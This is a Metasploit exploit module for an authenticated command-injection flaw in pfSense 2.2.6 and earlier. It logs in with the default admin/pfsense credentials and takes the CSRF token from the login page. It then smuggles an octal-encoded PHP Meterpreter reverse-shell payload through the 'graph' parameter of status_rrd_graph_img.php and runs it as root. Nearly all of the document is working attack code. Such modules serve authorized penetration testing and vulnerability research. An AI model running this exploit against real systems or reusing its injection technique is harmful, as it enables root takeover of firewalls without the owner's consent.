##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'pfSense authenticated graph status RCE',
        'Description' => %q(
          pfSense, a free BSD based open source firewall distribution,
          version <= 2.2.6 contains a remote command execution
          vulnerability post authentication in the _rrd_graph_img.php page.
          The vulnerability occurs via the graph GET parameter. A non-administrative
          authenticated attacker can inject arbitrary operating system commands
          and execute them as the root user. Verified against 2.1.3.
        ),
        'Author'      =>
          [
            'Security-Assessment.com',   # discovery
            'Milton Valencia (wetw0rk)', # metasploit module
            'Jared Stephens (mvrk)',     # python script
          ],
        'References'  =>
          [
            [ 'EDB', '39709' ],
            [ 'URL', 'http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf']
          ],
        'License'        => MSF_LICENSE,
        'Privileged'     => true,
        'DefaultOptions' =>
          {
            'SSL'         => true,
            'Encoder'     => 'php/base64',
            'PAYLOAD'     => 'php/meterpreter/reverse_tcp',
          },

        'DisclosureDate' => 'Apr 18, 2016',
        'Platform'       => 'php',
        'Arch'           => ARCH_PHP,
        'Targets'        => [[ 'Automatic Target', { }]],
        'DefaultTarget'  => 0,
      )
    )

    register_options(
      [
        OptString.new('USERNAME',  [ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD',  [ false, 'Password to login with', 'pfsense']),
        Opt::RPORT(443)
      ], self.class
    )
  end

  def login

    res = send_request_cgi(
      'uri'    => '/index.php',
      'method' => 'GET'
    )

    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200

    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_status("CSRF Token for login: #{csrf}")

    cookie = "PHPSESSID=#{res.get_cookies_parsed['PHPSESSID'][0]}; cookie_test=#{res.get_cookies_parsed['cookie_test'][0]};"

    res = send_request_cgi(
      'uri'        => '/index.php',
      'method'      => 'POST',
      'headers'     => {
        'User-Agent'                => 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language'           => 'en-US,en;q=0.5',
        'Accept-Encoding'           => 'gzip, deflate',
        'Referer'                   => "https://#{rhost}/index.php",
        'Cookie'                    => cookie,
        'Connection'                => 'close',
        'Upgrade-Insecure-Requests' => '1',
      },
      'vars_post'  => {
        '__csrf_magic' => csrf,
        'usernamefld'  => datastore['USERNAME'],
        'passwordfld'  => datastore['PASSWORD'],
        'login'        => 'Login'
      }
    )

    unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
    end
    if res.code == 302
      print_status('Authentication successful continuing exploitation')
      return cookie
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
      return nil
    end
  end

  def exploit
    begin
      cookie   = login
      filename = Rex::Text.to_rand_case("PaasdnatEoomaBb")

      # generate the PHP meterpreter payload
      stager = "echo \'<?php "
      stager << payload.encode
      stager << "?>\' > #{filename}"
      # here we begin the encoding process to
      # convert the payload to octal! Ugly code
      # don't look
      complete_stage = ""
      for i in 0..(stager.length()-1)
        complete_stage << "\\#{stager[i].ord.to_s(8)}"
      end

      print_status("Attempting to upload the initial payload as #{filename}")
      res = send_request_raw(
        'uri'      => "/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf%20%27#{complete_stage}%27|sh|echo",
        'method'   => 'GET',
        'headers'  => {
          'User-Agent'      => 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
          'Accept'          => '*/*',
          'Accept-Language' => 'en-US,en;q=0.5',
          'Accept-Encoding' => 'gzip, deflate',
          'Origin'          => 'null',
          'Cookie'          => cookie,
          'Connection'      => 'close',
        }
      )

      if res && res.code == 200
        print_good("Triggering the vulnerability, root shell incoming...")
      else
        print_error("Failed upload the initial payload...")
      end

      res = send_request_cgi({
        'uri'     => '/status_rrd_graph_img.php',
        'method'  => 'GET',
        'headers' => {
          'User-Agent'                => 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
          'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language'           => 'en-US,en;q=0.5',
          'Accept-Encoding'           => 'gzip, deflate',
          'Cookie'                    => cookie,
          'Connection'                => 'close',
          'Upgrade-Insecure-Requests' => '1',
        },
        'vars_get' => {
          'database' => '-throughput.rrd',
          'graph'    => "file|php #{filename}|echo #"
        }
      })
      disconnect
    end
  end
end
